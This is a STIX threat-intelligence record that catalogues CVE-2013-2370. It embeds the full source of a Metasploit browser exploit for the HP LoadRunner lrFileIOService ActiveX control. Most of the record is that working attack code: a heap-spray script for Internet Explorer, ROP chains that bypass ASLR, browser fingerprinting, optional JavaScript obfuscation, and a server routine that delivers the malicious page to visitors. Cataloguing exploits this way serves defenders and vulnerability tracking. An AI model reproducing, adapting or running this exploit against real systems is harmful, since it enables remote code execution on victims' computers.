{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2fa1e08e-12a6-4a4e-ba53-651871d42ba2",
    "created": "2024-08-14T16:44:45.544406Z",
    "modified": "2024-08-14T16:44:45.54441Z",
    "name": "\"HP LoadRunner lrFileIOService ActiveX Remote Code Execution\"",
    "description": " This module exploits a vulnerability on the lrFileIOService ActiveX, as installed with HP LoadRunner 11.50. The vulnerability exists in the WriteFileBinary method where user provided data is used as a memory pointer.  This module has been tested successfully on IE6-IE9 on Windows XP, Vista and 7, using the LrWebIERREWrapper.dll 11.50.2216.0. In order to bypass ASLR the no aslr compatible module msvcr71.dll is used. This one is installed with HP LoadRunner.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/hp_loadrunner_writefilebinary.rb",
            "external_id": "hp_loadrunner_writefilebinary.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-2370"
        },
        {
            "source_name": "reference",
            "url": "https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03862772"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RopDb\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #\n  #autopwn_info({\n  #  :ua_name    => HttpClients::IE,\n  #  :ua_minver  => \"6.0\",\n  #  :ua_maxver  => \"9.0\",\n  #  :javascript => true,\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :rank       => Rank,\n  #  :classid    => \"{8D9E2CC7-D94B-4977-8510-FB49C361A139}\",\n  #  :method     => \"WriteFileBinary\"\n  #})\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"HP LoadRunner lrFileIOService ActiveX Remote Code Execution\",\n      'Description'    => %q{\n        This module exploits a vulnerability on the lrFileIOService ActiveX, as installed\n        with HP LoadRunner 11.50. The vulnerability exists in the WriteFileBinary method\n        where user provided data is used as a memory pointer.  This module has been tested\n        successfully on IE6-IE9 on Windows XP, Vista and 7, using the LrWebIERREWrapper.dll\n        11.50.2216.0. In order to bypass ASLR the no aslr compatible module msvcr71.dll is\n        used. This one is installed with HP LoadRunner.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'rgod <rgod[at]autistici.org>', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-2370' ],\n          [ 'OSVDB', '95640' ],\n          [ 'BID', '61441'],\n          [ 'ZDI', '13-182' ],\n          [ 'URL', 'https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03862772' ]\n        ],\n      'Payload'        =>\n        {\n          'Space' => 1024,\n          'DisableNops' => true,\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\" # Stack adjustment # add esp, -3500\n        },\n      'DefaultOptions'  =>\n        {\n          'PrependMigrate' => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # LrWebIERREWrapper.dll 11.50.2216.0\n          [ 'Automatic', {} ],\n          [ 'IE 7 on Windows XP SP3', { 'Rop' => nil,  'Offset' => '0x5F4' } ],\n          [ 'IE 8 on Windows XP SP3', { 'Rop' => :jre, 'Offset' => '0x5f4' } ],\n          [ 'IE 7 on Windows Vista',  { 'Rop' => nil,  'Offset' => '0x5f4' } ],\n          [ 'IE 8 on Windows Vista',  { 'Rop' => :jre, 'Offset' => '0x5f4' } ],\n          [ 'IE 8 on Windows 7',      { 'Rop' => :jre, 'Offset' => '0x5f4' } ],\n          [ 'IE 9 on Windows 7',      { 'Rop' => :jre, 'Offset' => '0x5fe' } ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-07-24',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n      ])\n\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    nt = agent.scan(/Windows NT (\\d\\.\\d)/).flatten[0] || ''\n    ie = agent.scan(/MSIE (\\d)/).flatten[0] || ''\n\n    ie_name = \"IE #{ie}\"\n\n    case nt\n    when '5.1'\n      os_name = 'Windows XP SP3'\n    when '6.0'\n      os_name = 'Windows Vista'\n    when '6.1'\n      os_name = 'Windows 7'\n    end\n\n    targets.each do |t|\n      if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))\n        print_status(\"Target selected as: #{t.name}\")\n        return t\n      end\n    end\n\n    return nil\n  end\n\n  def ie_heap_spray(my_target, p)\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4, Rex::Arch.endian(target.arch))\n    js_random_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(my_target.arch))\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    # Land the payload at 0x0c0c0c0c\n    case my_target\n    when targets[6]\n      # IE 9 on Windows 7\n      js = %Q|\n      function randomblock(blocksize)\n      {\n        var theblock = \"\";\n        for (var i = 0; i < blocksize; i++)\n        {\n          theblock += Math.floor(Math.random()*90)+10;\n        }\n        return theblock;\n      }\n\n      function tounescape(block)\n      {\n        var blocklen = block.length;\n        var unescapestr = \"\";\n        for (var i = 0; i < blocklen-1; i=i+4)\n        {\n          unescapestr += \"%u\" + block.substring(i,i+4);\n        }\n        return unescapestr;\n      }\n\n      var heap_obj = new heapLib.ie(0x10000);\n      var code = unescape(\"#{js_code}\");\n      var #{randnop} = \"#{js_random_nops}\";\n      var nops = unescape(#{randnop});\n      while (nops.length < 0x80000) nops += nops;\n      var offset_length = #{my_target['Offset']};\n      for (var i=0; i < 0x1000; i++) {\n        var padding = unescape(tounescape(randomblock(0x1000)));\n        while (padding.length < 0x1000) padding+= padding;\n        var junk_offset = padding.substring(0, offset_length);\n        var single_sprayblock = junk_offset + code + nops.substring(0, 0x800 - code.length - junk_offset.length);\n        while (single_sprayblock.length < 0x20000) single_sprayblock += single_sprayblock;\n        sprayblock = single_sprayblock.substring(0, (0x40000-6)/2);\n        heap_obj.alloc(sprayblock);\n      }\n      |\n\n    else\n      # For IE 6, 7, 8\n      js = %Q|\n      var heap_obj = new heapLib.ie(0x20000);\n      var code = unescape(\"#{js_code}\");\n      var #{randnop} = \"#{js_nops}\";\n      var nops = unescape(#{randnop});\n      while (nops.length < 0x80000) nops += nops;\n      var offset = nops.substring(0, #{my_target['Offset']});\n      var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n      while (shellcode.length < 0x40000) shellcode += shellcode;\n      var block = shellcode.substring(0, (0x80000-6)/2);\n      heap_obj.gc();\n      for (var i=1; i < 0x300; i++) {\n        heap_obj.alloc(block);\n      }\n      |\n\n    end\n\n    js = heaplib(js, {:noobfu => true})\n\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n    end\n\n    return js\n  end\n\n  def get_payload(t, cli)\n    code = payload.encoded\n\n    fake_object = [\n      0x0c0c0c0c, # fake vftable pointer\n      0x0c0c0c14  # function pointer\n    ].pack(\"V*\")\n\n    # No rop. Just return the payload.\n    return fake_object + code if t['Rop'].nil?\n\n    # Both ROP chains generated by mona.py - See corelan.be\n    case t['Rop']\n    when :jre\n      print_status(\"Using msvcr71.dll ROP\")\n      fake_object = [\n        0x0c0c0c0c, # fake vftable pointer\n        0x7c342643  # xchg eax,esp # pop edi # add byte ptr ds:[eax],al # pop ecx # retn\n      ].pack(\"V*\")\n      rop_payload = fake_object + generate_rop_payload('java', code)#, {'pivot'=>stack_pivot})\n    end\n\n    return rop_payload\n  end\n\n  def load_exploit_html(my_target, cli)\n    p  = get_payload(my_target, cli)\n    js = ie_heap_spray(my_target, p)\n    object_id = rand_text_alpha(rand(10) + 8)\n\n    html = %Q|\n    <html>\n    <head>\n    <script>\n    #{js}\n    </script>\n    </head>\n    <body>\n    <object classid='clsid:8D9E2CC7-D94B-4977-8510-FB49C361A139' id='#{object_id}'></object>\n    <script language='javascript'>\n    #{object_id}.WriteFileBinary(\"#{rand_text_alpha(4+ rand(4))}\", 0x0c0c0c0c);\n    </script>\n    </body>\n    </html>\n    |\n\n    return html\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    uri   = request.uri\n    print_status(\"Requesting: #{uri}\")\n\n    my_target = get_target(agent)\n    # Avoid the attack if no suitable target found\n    if my_target.nil?\n      print_error(\"Browser not supported, sending 404: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    html = load_exploit_html(my_target, cli)\n    html = html.gsub(/^ {4}/, '')\n    print_status(\"Sending HTML...\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-07-24",
    "x_mitre_platforms": [
        "win'"
    ]
}